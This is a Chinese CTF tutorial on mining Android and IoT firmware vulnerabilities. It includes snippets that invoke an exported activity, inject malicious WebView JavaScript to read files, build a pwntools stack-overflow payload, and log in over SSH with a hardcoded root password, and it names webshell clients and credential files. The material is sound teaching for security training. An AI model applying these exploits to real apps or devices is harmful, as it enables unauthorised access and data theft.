# 漏洞挖掘实战系列（第7期）：跨场景移动端与物联网漏洞挖掘

## 1. 问题现状 (Current Status & Problem Analysis)

### 背景描述

CTF赛事中，移动端漏洞和物联网固件漏洞是"低竞争、高性价比"的题型。这两类题目选手覆盖率低，但套路固定、工具成熟，掌握后能轻松拉开分差。本文聚焦Android/iOS移动端、物联网固件的高频漏洞，用2025真题案例拆解"逆向→挖洞→利用"全流程。

### 风险评估

- **移动端风险**：组件暴露导致未授权访问，WebView漏洞可导致RCE
- **物联网风险**：硬编码密码、栈溢出漏洞、敏感信息泄露
- **CTF得分**：移动端和IoT题目竞争小，掌握后容易获奖

### 影响范围

- CTF渗透测试比赛
- 移动安全研究
- 物联网安全评估

## 2. 解决思路与方案对比 (Solution Options & Analysis)

### 移动端 vs 物联网对比

| 方面 | 移动端 (Android) | 物联网 (IoT) |
|------|------------------|--------------|
| 主要漏洞 | 组件暴露、WebView漏洞 | 硬编码密码、栈溢出 |

| 分析对象 | APK文件 | 固件bin文件 |
| 难度 | 入门简单 | 需要Linux基础 |
| CTF性价比 | 高 | 高 |

## 3. 最佳实践框架 (Best Practice Framework)

### 移动端漏洞挖掘流程

```
APK文件
    │
    ├─→ Jadx 反编译分析
    │   ├─→ AndroidManifest.xml (组件暴露)
    │   └─→ 源码审计 (WebView)
    │
    ├─→ 漏洞利用
    │   ├─→ 组件暴露 → 直接调用
    │   └─→ WebView → 构造恶意HTML
    │
    └─→ Frida Hook 动态分析
```

### 物联网漏洞挖掘流程

```
固件文件 (.bin)
    │
    ├─→ Binwalk 提取文件系统
    │   └─→ rootfs/
    │
    ├─→ 文件系统分析
    │   ├─→ /etc/passwd (密码)
    │   ├─→ /bin/httpd (Web服务)
    │   └─→ 二进制程序逆向
    │
    └─→ QEMU 模拟运行 + 漏洞利用
```

## 4. 具体操作步骤 (Implementation Steps)

### 4.1 移动端漏洞：Android为主

#### 必备工具链

| 工具 | 作用 | 安装方式 |
|------|------|----------|
| Jadx | APK反编译（看源码） | 官网下载绿色版 |
| Android Studio | 模拟器运行+调试 | 官网下载 |
| Frida | 动态插桩（Hook函数） | `pip install frida-tools` |
| Apktool | APK解包/重打包 | 下载jar文件 |
| 蚁剑/菜刀 | 连接一句话木马 | 官网下载 |

#### 高频漏洞1：组件暴露

**漏洞本质**：
Android的Activity、Service、BroadcastReceiver等组件，在`AndroidManifest.xml`中配置了`android:exported="true"`（允许外部调用），且未做权限校验。

**识别方法**：
1. 用Jadx打开APK，查看`AndroidManifest.xml`
2. 找`android:exported="true"`的组件
3. 包含敏感关键词（admin、login、user）

**真题实战：2025强网杯「android_export」**

```bash
# 1. 用Jadx打开APK，找到 AdminActivity
# 2. 发现 onCreate 方法中调用 getFlag()，返回flag
# 3. AndroidManifest.xml 配置 android:exported="true"，无权限校验

# 利用：创建空APP调用 AdminActivity
Intent intent = new Intent();
intent.setComponent(new ComponentName("目标包名", "目标包名.AdminActivity"));
startActivity(intent);
# 页面直接显示 flag{android_export_bypass_2025}
```

**Frida Hook简化利用**：
```python
import frida
script = """
Java.perform(function() {
    var Activity = Java.use("com.example.AdminActivity");
    Activity.getFlag.implementation = function() {
        console.log("Flag: " + this.getFlag());
    }
});
"""
```

#### 高频漏洞2：WebView漏洞

**漏洞本质**：
WebView启用`setJavaScriptEnabled(true)`，且暴露了`addJavascriptInterface`，攻击者可通过注入恶意JS调用敏感Java方法，实现文件读取或RCE。

**识别方法**：
```java
// 用Jadx搜索关键词
setJavaScriptEnabled(true)
addJavascriptInterface
```

**真题实战：WebView RCE读取flag**

```html
<!-- 构造恶意HTML -->
<script>
function readFile() {
    // 调用Java方法读取文件
    android.getFileContent("/flag");
}
readFile();
</script>
```

```python
# 开启本地服务器
python -m http.server 8080

# 让目标APP的WebView加载该HTML
# 恶意JS调用 getFileContent("/flag")，读取flag
```

#### 移动端避坑清单

- **模拟器版本**：用Android 9/10，高版本权限更严格
- **Frida版本**：Frida-server需与Frida-tools版本一致
- **签名问题**：重打包APK后需重新签名
- **敏感文件路径**：`/data/data/包名/files/flag` 或 `/sdcard/flag`

### 4.2 物联网固件漏洞

#### 必备工具链

| 工具 | 作用 | 安装方式 |
|------|------|----------|
| Binwalk | 固件提取 | `apt install binwalk` |
| Foremost | 辅助提取文件 | `apt install foremost` |
| QEMU | 模拟固件运行 | `apt install qemu-system-arm qemu-user-static` |
| Ghidra | 固件二进制逆向 | 官网下载 |
| Hashcat | 密码爆破 | `apt install hashcat` |

#### 核心流程：三步法

**步骤1：固件提取**

```bash
# Binwalk 提取固件
binwalk firmware.bin

# 提取文件系统
binwalk -e firmware.bin

# 提取后生成 _firmware.bin.extracted 目录
# rootfs 是固件的文件系统
```

**步骤2：文件系统分析**

```bash
# 优先查找敏感文件
/etc/passwd        # 用户密码哈希
/etc/shadow        # 影子密码
/etc/ssh/sshd_config  # SSH配置
/var/www/html     # Web后台文件
/bin              # 二进制程序

# 用Ghidra逆向二进制程序
# 搜索字符串：password、root、flag
```

**步骤3：QEMU模拟运行**

```bash
# ARM架构模拟
qemu-arm -L rootfs rootfs/bin/httpd

# 或使用静态链接
qemu-arm -L rootfs -g 1234 rootfs/bin/iot_server &

# gdb调试
gdb-multiarch
target remote localhost:1234
```

#### 真题实战1：硬编码密码

**2025西湖论剑「iot_crack」**

```bash
# 1. 用Binwalk提取固件
binwalk -e firmware.bin
# 得到 rootfs/bin/httpd

# 2. 用Ghidra打开 httpd
# 搜索字符串 password、root

# 3. 找到硬编码密码
# root:iot2025ctf

# 4. 用QEMU模拟，SSH登录
ssh root@192.168.1.1
# 密码: iot2025ctf

# 5. 读取flag
cat /flag
```

#### 真题实战2：栈溢出漏洞

**物联网Pwn**

```c
// 漏洞代码
void main() {
    char buf[0x20];
    gets(buf);  // 未限制输入长度
}
```

```python
# 构造Payload
from pwn import *

p = process(['qemu-arm', '-g', '1234', './iot_server'])
# 或远程
# p = remote('target_ip', port)

# 生成溢出字符串
payload = cyclic(0x30)
payload += p32(address_of_shellcode)

p.sendline(payload)
p.interactive()
```

#### 物联网避坑清单

- **架构匹配**：固件多为ARM/MIPS，QEMU需安装对应架构
- **文件系统权限**：提取后可能需要 `chmod -R 777 rootfs`
- **动态库依赖**：拷贝 `libc.so` 到 `rootfs/lib`
- **网络配置**：用 `ifconfig` 设置IP

## 5. 总结与建议 (Summary & Recommendations)

### 跨场景漏洞核心技巧

| 场景 | 优先挖掘方向 | 关键工具 |
|------|-------------|----------|
| 移动端 | 组件暴露、WebView | Jadx+Frida |
| 物联网 | 硬编码密码、栈溢出 | Binwalk+Ghidra+QEMU |
| 通用 | 经典漏洞+场景适配 | 复用Web/Pwn思路 |

### CTF比赛建议

1. **移动端**：优先找"组件暴露"和"WebView漏洞"，工具用Jadx+Frida，无需深入Android底层
2. **物联网**：基础题先找"硬编码密码"，进阶题再看"二进制漏洞"，QEMU是模拟运行的核心
3. **通用思路**：CTF跨场景漏洞不考"实战0day"，多是"经典漏洞+场景适配"
